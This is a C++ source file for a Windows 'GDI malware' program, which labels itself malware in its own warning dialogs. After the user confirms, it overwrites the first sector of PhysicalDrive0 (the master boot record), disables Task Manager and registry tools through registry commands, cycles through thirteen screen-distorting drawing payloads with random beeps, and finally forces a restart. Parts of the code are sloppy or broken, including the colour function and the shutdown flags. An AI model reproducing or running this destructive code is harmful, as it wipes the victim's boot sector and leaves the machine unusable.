#include <Windows.h>
#pragma comment(lib, "winmm.lib")
#define _USE_MATH_DEFINES 1
#include <cmath>
#define M_PI   3.14159265358979323846264338327950288
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}
DWORD WINAPI Disable(LPVOID lpParam) {
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
    return 0;
}
DWORD WINAPI payload1() {
    BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
    void* ppvBits; // [rsp+80h] [rbp+0h] BYREF
    int v3; // [rsp+8Ch] [rbp+Ch]
    int v4; // [rsp+90h] [rbp+10h]
    int v5; // [rsp+94h] [rbp+14h]
    HGDIOBJ h; // [rsp+98h] [rbp+18h]
    int cy; // [rsp+A0h] [rbp+20h]
    int SystemMetrics; // [rsp+A4h] [rbp+24h]
    HDC hdcSrc; // [rsp+A8h] [rbp+28h]
    HDC hdc; // [rsp+B0h] [rbp+30h]
    int i; // [rsp+BCh] [rbp+3Ch]

    hdc = GetDC(0i64);
    hdcSrc = CreateCompatibleDC(hdc);
    SystemMetrics = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    memset(&pbmi, 0, sizeof(pbmi));
    ppvBits = 0i64;
    pbmi.bmiHeader.biSize = 44;
    pbmi.bmiHeader.biBitCount = 32;
    pbmi.bmiHeader.biPlanes = 1;
    pbmi.bmiHeader.biWidth = SystemMetrics;
    pbmi.bmiHeader.biHeight = cy;
    h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
    SelectObject(hdcSrc, h);
    while (1)
    {
        hdc = GetDC(0i64);
        BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0x330008u);
        for (i = 0; cy * SystemMetrics > i; ++i)
        {
            v5 = i % SystemMetrics;
            v4 = i / SystemMetrics + i % SystemMetrics;
            v3 = v4 + i % SystemMetrics / 255 + cy;
            *((BYTE*)ppvBits + 4 * i + 2) += (i % SystemMetrics < v4) > cy / SystemMetrics - v3 + 255;
            *((BYTE*)ppvBits + 4 * i + 1) += (unsigned __int16)(v5 + v4 - 255 / cy) >> 8;
            *((BYTE*)ppvBits + 4 * i) += (unsigned int)(v4 / cy + v5 + SystemMetrics / 255) >> 16;
        }
        BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0x330008u);
        ReleaseDC(0i64, hdc);
        DeleteDC(hdc);
    }
}
DWORD WINAPI payload2 () {
    int hSrc; // [rsp+60h] [rbp-10h]
    int wDest; // [rsp+64h] [rbp-Ch]
    HDC hdcDest; // [rsp+68h] [rbp-8h]

    while (1)
    {
        hdcDest = GetDC(0i64);
        wDest = GetSystemMetrics(0);
        hSrc = GetSystemMetrics(1);
        StretchBlt(hdcDest, -10, -10, wDest + 20, hSrc + 20, hdcDest, 0, 0, wDest, hSrc, 0xCC0020u);
        StretchBlt(hdcDest, -13, -13, wDest + 27, hSrc + 27, hdcDest, 0, 0, wDest, hSrc, 0xCC0020u);
        StretchBlt(hdcDest, -10, -10, wDest + 20, hSrc + 20, hdcDest, 0, 0, wDest, hSrc, 0xCC0020u);
        StretchBlt(hdcDest, -6, -6, wDest + 13, hSrc + 13, hdcDest, 0, 0, wDest, hSrc, 0xCC0020u);
        StretchBlt(hdcDest, 1, 2, wDest, hSrc, hdcDest, -2, -1, wDest, hSrc, 0xCC0020u);
        StretchBlt(hdcDest, -2, -1, wDest, hSrc, hdcDest, 1, 2, wDest, hSrc, 0xCC0020u);
        StretchBlt(hdcDest, -1, -1, wDest, hSrc, hdcDest, 0, 0, wDest, hSrc, 0xCC0020u);
        ReleaseDC(0i64, hdcDest);
    }
}
DWORD WINAPI payload3 () {
    int v0; // eax
    HBRUSH SolidBrush; // rax
    HDC hdc; // [rsp+38h] [rbp+8h]
    int w; // [rsp+54h] [rbp+24h]
    int h; // [rsp+74h] [rbp+44h]
    int v5; // [rsp+144h] [rbp+114h]
    int v6; // [rsp+148h] [rbp+118h]

    GetDC(0i64);
    w = GetSystemMetrics(0);
    h = GetSystemMetrics(1);
    while (1)
    {
        hdc = GetDC(0i64);
        v5 = (unsigned __int8)(rand() % 155);
        v6 = ((unsigned __int8)(rand() % 155) << 8) | v5;
        v0 = rand();
        SolidBrush = CreateSolidBrush(((unsigned __int8)(v0 % 155) << 16) | (unsigned int)v6);
        SelectObject(hdc, SolidBrush);
        PatBlt(hdc, 0, 0, w, h, 0x5A0049u);
        Sleep(0xAu);
    }
}
DWORD WINAPI payload4 () {
    int v0; // eax
    HBRUSH SolidBrush; // rax
    HDC hdc; // [rsp+38h] [rbp+8h]
    int w; // [rsp+54h] [rbp+24h]
    int h; // [rsp+74h] [rbp+44h]
    int v5; // [rsp+144h] [rbp+114h]
    int v6; // [rsp+148h] [rbp+118h]

    GetDC(0i64);
    w = GetSystemMetrics(0);
    h = GetSystemMetrics(1);
    while (1)
    {
        hdc = GetDC(0i64);
        v5 = (unsigned __int8)(rand() % 50);
        v6 = ((unsigned __int8)(rand() % 50) << 8) | v5;
        v0 = rand();
        SolidBrush = CreateSolidBrush(((unsigned __int8)(v0 % 50) << 16) | (unsigned int)v6);
        SelectObject(hdc, SolidBrush);
        PatBlt(hdc, 0, 0, w, h, 0x5A0049u);
        Sleep(0xAu);
    }
}
DWORD WINAPI payload5 () {
    unsigned __int64 v1; // rax
    unsigned __int64 v2; // rax
    COLORREF v3; // eax
    unsigned __int64 v4; // rax
    unsigned __int64 v5; // rax
    char v6; // [rsp+30h] [rbp-50h]
    HBRUSH h; // [rsp+38h] [rbp-48h]
    HPEN Pen; // [rsp+40h] [rbp-40h]
    unsigned int v9; // [rsp+48h] [rbp-38h]
    unsigned int v10; // [rsp+48h] [rbp-38h]
    unsigned int v11; // [rsp+48h] [rbp-38h]
    unsigned int v12; // [rsp+48h] [rbp-38h]
    int v13; // [rsp+48h] [rbp-38h]
    HDC hdc; // [rsp+50h] [rbp-30h]
    unsigned int v15; // [rsp+58h] [rbp-28h]
    unsigned int SystemMetrics; // [rsp+5Ch] [rbp-24h]
    int v17; // [rsp+60h] [rbp-20h]
    int v18; // [rsp+64h] [rbp-1Ch]
    int v19; // [rsp+68h] [rbp-18h]
    int v20; // [rsp+6Ch] [rbp-14h]
    int left; // [rsp+70h] [rbp-10h]
    int bottom; // [rsp+74h] [rbp-Ch]
    int top; // [rsp+78h] [rbp-8h]
    int right; // [rsp+7Ch] [rbp-4h]

    SystemMetrics = GetSystemMetrics(0);
    v15 = GetSystemMetrics(1);
    hdc = GetDC(0i64);
    v1 = __rdtsc();
    v9 = ((((DWORD)v1 << 13) ^ (unsigned int)v1) << 17) ^ ((DWORD)v1 << 13) ^ v1;
    v17 = (v9 ^ (unsigned __int64)(32 * v9)) % SystemMetrics;
    v2 = __rdtsc();
    v10 = ((((DWORD)v2 << 13) ^ (unsigned int)v2) << 17) ^ ((DWORD)v2 << 13) ^ v2;
    v18 = (v10 ^ (unsigned __int64)(32 * v10)) % v15;
    Pen = CreatePen(0, 2, 0xFFFFFFu);
LABEL_2:
    v3 = Hue(241);
    h = CreateSolidBrush(v3);
    SelectObject(hdc, h);
    SelectObject(hdc, Pen);
    if ((int)SystemMetrics <= v17 || (int)v15 <= v18 || v17 <= 0 || v18 <= 0)
    {
        v4 = __rdtsc();
        v11 = ((((DWORD)v4 << 13) ^ (unsigned int)v4) << 17) ^ ((DWORD)v4 << 13) ^ v4;
        v17 = (v11 ^ (unsigned __int64)(32 * v11)) % SystemMetrics;
        v5 = __rdtsc();
        v12 = ((((DWORD)v5 << 13) ^ (unsigned int)v5) << 17) ^ ((DWORD)v5 << 13) ^ v5;
        v18 = (v12 ^ (unsigned __int64)(32 * v12)) % v15;
    }
    v6 = __rdtsc();
    left = v17 - 60;
    top = v18 - 60;
    v13 = v6 & 3;
    right = v17 + 60;
    bottom = v18 + 60;
    v20 = 10;
    v19 = v17 + 60;
    while (1)
    {
        if ((v6 & 3) != 0)
        {
            switch (v13)
            {
            case 1:
                Ellipse(hdc, left, top, right, bottom);
                v17 += 20;
                v19 += 20;
                left += 20;
                break;
            case 2:
                Ellipse(hdc, left, top, right, bottom);
                v17 -= 20;
                left -= 20;
                v19 -= 20;
                bottom += 20;
                v18 += 20;
                top += 20;
                goto LABEL_10;
            case 3:
                Ellipse(hdc, left, top, right, bottom);
                v17 -= 20;
                v19 -= 20;
                left -= 20;
                break;
            default:
                goto LABEL_18;
            }
            v18 -= 20;
            bottom -= 20;
            top -= 20;
        }
        else
        {
            Ellipse(hdc, left, top, right, bottom);
            v17 += 20;
            left += 20;
            v19 += 20;
            bottom += 20;
            v18 += 20;
            top += 20;
        }
    LABEL_10:
        Sleep(1u);
        right = v19;
    LABEL_18:
        if (!--v20)
        {
            DeleteObject(h);
            goto LABEL_2;
        }
    }
}
DWORD WINAPI payload6 () {
    COLORREF v1; // eax
    HBRUSH h; // [rsp+58h] [rbp-18h]
    int cy; // [rsp+60h] [rbp-10h]
    int SystemMetrics; // [rsp+64h] [rbp-Ch]
    HDC hdc; // [rsp+68h] [rbp-8h]

    while (1)
    {
        hdc = GetDC(0i64);
        SystemMetrics = GetSystemMetrics(0);
        cy = GetSystemMetrics(1);
        v1 = Hue(236);
        h = CreateSolidBrush(v1);
        SelectObject(hdc, h);
        BitBlt(hdc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0xF00021u);
        DeleteObject(h);
        ReleaseDC(0i64, hdc);
    }
}
DWORD WINAPI payload7 () {
    HBITMAP h; // [rsp+60h] [rbp-20h]
    HDC hdcSrc; // [rsp+68h] [rbp-18h]
    HDC hdc; // [rsp+70h] [rbp-10h]
    void* lpvBits; // [rsp+78h] [rbp-8h]
    int nHeight; // [rsp+80h] [rbp+0h]
    int nWidth; // [rsp+84h] [rbp+4h]
    int j; // [rsp+88h] [rbp+8h]
    int i; // [rsp+8Ch] [rbp+Ch]

    nWidth = GetSystemMetrics(0);
    nHeight = GetSystemMetrics(1);
    lpvBits = VirtualAlloc(0i64, 4i64 * nWidth * (nHeight + 1), 0x3000u, 4u);
    for (i = 0; ; i = (i + 1) % 3)
    {
        hdc = GetDC(0i64);
        hdcSrc = CreateCompatibleDC(hdc);
        h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
        SelectObject(hdcSrc, h);
        BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0x1100A6u);
        GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        for (j = 0; nWidth * (nHeight + 1) > j; ++j)
            *((DWORD*)lpvBits + j) = Hue(3456);
        SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0x1100A6u);
        DeleteObject(h);
        DeleteObject(hdcSrc);
        DeleteObject(hdc);
    }
}
DWORD WINAPI payload8() {
  HBITMAP h; // [rsp+60h] [rbp-20h]
  HDC hdcSrc; // [rsp+68h] [rbp-18h]
  HDC hdc; // [rsp+70h] [rbp-10h]
  void* lpvBits; // [rsp+78h] [rbp-8h]
  int nHeight; // [rsp+80h] [rbp+0h]
  int nWidth; // [rsp+84h] [rbp+4h]
  int j; // [rsp+88h] [rbp+8h]
  int i; // [rsp+8Ch] [rbp+Ch]

  nWidth = GetSystemMetrics(0);
  nHeight = GetSystemMetrics(1);
  lpvBits = VirtualAlloc(0i64, 4i64 * nWidth * (nHeight + 1), 0x3000u, 4u);
  for (i = 0; ; i = (i + 1) % 3)
  {
    hdc = GetDC(0i64);
    hdcSrc = CreateCompatibleDC(hdc);
    h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
    SelectObject(hdcSrc, h);
    BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0x440328u);
    GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
    for (j = 0; nWidth * (nHeight + 1) > j; ++j)
      *((DWORD*)lpvBits + j) = Hue(239);
    SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
    BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0x440328u);
    DeleteObject(h);
    DeleteObject(hdcSrc);
    DeleteObject(hdc);
  }
}
DWORD WINAPI payload9() {
    HBITMAP h; // [rsp+60h] [rbp-20h]
    HDC hdcSrc; // [rsp+68h] [rbp-18h]
    HDC hdc; // [rsp+70h] [rbp-10h]
    void* lpvBits; // [rsp+78h] [rbp-8h]
    int nHeight; // [rsp+80h] [rbp+0h]
    int nWidth; // [rsp+84h] [rbp+4h]
    int j; // [rsp+88h] [rbp+8h]
    int i; // [rsp+8Ch] [rbp+Ch]

    nWidth = GetSystemMetrics(0);
    nHeight = GetSystemMetrics(1);
    lpvBits = VirtualAlloc(0i64, 4i64 * nWidth * (nHeight + 1), 0x3000u, 4u);
    for (i = 0; ; i = (i + 1) % 3)
    {
        hdc = GetDC(0i64);
        hdcSrc = CreateCompatibleDC(hdc);
        h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
        SelectObject(hdcSrc, h);
        BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0x1100A6u);
        GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        for (j = 0; nWidth * (nHeight + 1) > j; ++j)
            *((DWORD*)lpvBits + j) = Hue(238);
        SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0x1100A6u);
        DeleteObject(h);
        DeleteObject(hdcSrc);
        DeleteObject(hdc);
    }
}
DWORD WINAPI payload10() {
    int hDest; // [rsp+60h] [rbp-10h]
    int wDest; // [rsp+64h] [rbp-Ch]
    HDC hdc; // [rsp+68h] [rbp-8h]

    while (1)
    {
        hdc = GetDC(0i64);
        wDest = GetSystemMetrics(0);
        hDest = GetSystemMetrics(1);
        SetStretchBltMode(hdc, 1);
        StretchBlt(hdc, 0, 0, wDest, hDest, hdc, 0, 0, wDest - 20, hDest - 100, 0x440328u);
        ReleaseDC(0i64, hdc);
    }
}
DWORD WINAPI payload11() {
    __int64 result; // rax
    int v2; // eax
    HDC hdc; // [rsp+30h] [rbp-30h]
    int v4; // [rsp+3Ch] [rbp-24h]
    int v5; // [rsp+44h] [rbp-1Ch]
    unsigned __int8 v6; // [rsp+48h] [rbp-18h]
    unsigned __int8 v7; // [rsp+4Ch] [rbp-14h]
    int v8; // [rsp+50h] [rbp-10h]
    int SystemMetrics; // [rsp+54h] [rbp-Ch]
    int x; // [rsp+58h] [rbp-8h]
    int y; // [rsp+5Ch] [rbp-4h]

    SystemMetrics = GetSystemMetrics(1);
    v8 = GetSystemMetrics(0);
    v7 = GetSystemMetrics(17);
    v6 = GetSystemMetrics(16);
    v5 = v8 - rand() % v8 - (v8 / 150 - 112) % 149;
    result = 0i64;
    if (SystemMetrics > 0)
    {
        v4 = (int)round((double)(v8 / SystemMetrics));
        while (1)
        {
            hdc = GetDC(0i64);
            for (y = 0; y < SystemMetrics; ++y)
            {
                for (x = 0; x < v8; ++x)
                {
                    v2 = ((unsigned __int8)(x * v4) << 16) | (unsigned __int8)y;
                    SetPixel(hdc, x, y, v2);
                    SetPixel(hdc, y, v5, (v6 << 16) | ((unsigned __int8)(x * v4) << 8) | v7);
                    SetPixel(hdc, v5, v5, 0);
                    SetPixel(hdc, v5, y, 0);
                }
            }
            ReleaseDC(0i64, hdc);
        }
    }
    return result;
}
DWORD WINAPI payload12() {
    int y1; // esi
    int x1; // ebx
    int v3; // edi
    int v4; // eax
    HDC hdc; // [rsp+50h] [rbp-30h]
    int cy; // [rsp+58h] [rbp-28h]
    int SystemMetrics; // [rsp+5Ch] [rbp-24h]

    SystemMetrics = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    while (1)
    {
        hdc = GetDC(0i64);
        y1 = rand() % 999;
        x1 = rand() % 999;
        v3 = rand() % 999;
        v4 = rand();
        BitBlt(hdc, v4 % 10, v3, SystemMetrics, cy, hdc, x1, y1, 0x440328u);
        Sleep(0xAu);
        ReleaseDC(0i64, hdc);
    }
}
DWORD WINAPI payload13() {
    int y1; // esi
    int x1; // ebx
    int v3; // edi
    int v4; // eax
    int v5; // esi
    int v6; // ebx
    int v7; // edi
    int v8; // eax
    int cy; // [rsp+50h] [rbp-30h]
    int SystemMetrics; // [rsp+54h] [rbp-2Ch]
    HDC hdc; // [rsp+58h] [rbp-28h]

    GetDC(0i64);
    SystemMetrics = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    while (1)
    {
        hdc = GetDC(0i64);
        y1 = rand() % 999;
        x1 = rand() % 999;
        v3 = rand() % 999;
        v4 = rand();
        BitBlt(hdc, v4 % 999, v3, SystemMetrics, cy, hdc, x1, y1, 0xEE0086u);
        v5 = rand() % 999;
        v6 = rand() % 999;
        v7 = rand() % 999;
        v8 = rand();
        BitBlt(hdc, v8 % 999, v7, SystemMetrics, cy, hdc, v6, v5, 0x8800C6u);
        ReleaseDC(0i64, hdc);
    }
}
DWORD WINAPI beep() {
    DWORD v1; // ebx
    int v2; // eax

    while (1)
    {
        v1 = rand() % 999 + 50;
        v2 = rand();
        Beep(v2 % 3000 + 500, v1);
    }
}

int main() {
    HANDLE v5; // edi
    HANDLE v4; // edi
    HANDLE v6; // edi
    HANDLE v7; // edi
    HANDLE v8; // esi
    HANDLE v9; // esi
    HANDLE v10; // esi
    HANDLE v11; // esi
    HANDLE v12; // esi
    HANDLE v13; // esi
    HANDLE v14; // edi
    HANDLE v16; // esi
    HANDLE v17; // esi
    HANDLE v18; // esi
    HANDLE v19; // ebx
    HANDLE v20; // edi
    HANDLE v21; // esi
    HANDLE v22; // esi
    HANDLE v23; // esi
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (MessageBoxW(NULL, L"you know perfectly, what is this, so I don't wanna wrote more", L"vocoder", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"LAST WARNING!!!\r\n\THIS IS A MALWARE\r\n\EXECUTE???", L"LAST WARNING!!!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            DWORD NumberOfBytesWritten; // [esp+10h] [ebp-8h]
            v7 = CreateFileW(L"\\\\.\\PhysicalDrive0", 0x10000000u, 3u, 0, 3u, 0, 0);
            WriteFile(v7, "ë", 0x200u, &NumberOfBytesWritten, 0);
            CloseHandle(v7);
            v6 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload1, 0, 0, 0);
            v4 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)beep, 0, 0, 0);
            v5 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Disable, 0, 0, 0);
            Sleep(0x7530u);
            TerminateThread(v6, 0);
            CloseHandle(v6);
            InvalidateRect(0, 0, 0);
            v8 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload2, 0, 0, 0);
            Sleep(0x3A98u);
            TerminateThread(v8, 0);
            CloseHandle(v8);
            InvalidateRect(0, 0, 0);
            v9 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload3, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v9, 0);
            CloseHandle(v9);
            InvalidateRect(0, 0, 0);
            v10 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload4, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v10, 0);
            CloseHandle(v10);
            v11 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload5, 0, 0, 0);
            Sleep(0x3A98u);
            TerminateThread(v11, 0);
            CloseHandle(v11);
            v12 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload6, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v12, 0);
            CloseHandle(v12);
            v13 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload7, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v13, 0);
            CloseHandle(v13);
            v14 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload8, 0, 0, 0);
            Sleep(0x4E20u);
            TerminateThread(v14, 0);
            CloseHandle(v14);
            v16 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload9, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v16, 0);
            CloseHandle(v16);
            v17 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload10, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v17, 0);
            CloseHandle(v17);
            v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload11, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v18, 0);
            CloseHandle(v18);
            v19 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload12, 0, 0, 0);
            Sleep(0x61A8u);
            TerminateThread(v19, 0);
            CloseHandle(v19);
            v20 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload13, 0, 0, 0);
            Sleep(0x61A8u);
            system("C:\\Windows\\System32\\shutdown /r t- 0");
        }
    }
}